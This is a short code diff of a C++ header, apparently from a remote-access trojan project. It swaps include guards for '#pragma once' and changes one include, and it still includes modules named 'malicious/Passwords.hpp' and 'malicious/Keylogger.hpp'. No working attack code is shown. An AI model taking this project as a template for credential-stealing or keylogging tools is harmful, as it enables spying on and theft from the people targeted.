@@ -1,7 +1,6 @@
-#ifndef _REMOTE_CONTROL_FUNCTIONS_
-#define _REMOTE_CONTROL_FUNCTIONS_
+#pragma once
 
-#include <blaspheme/protocol/ConnectionInfo.hpp>
+#include <Innocence.hpp>
 #include <common/Log.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Keylogger.hpp>
@@ -138,5 +137,3 @@ namespace Inhibition
     };
 
 }  // Inhibition
-
-#endif // _REMOTE_CONTROL_FUNCTIONS_
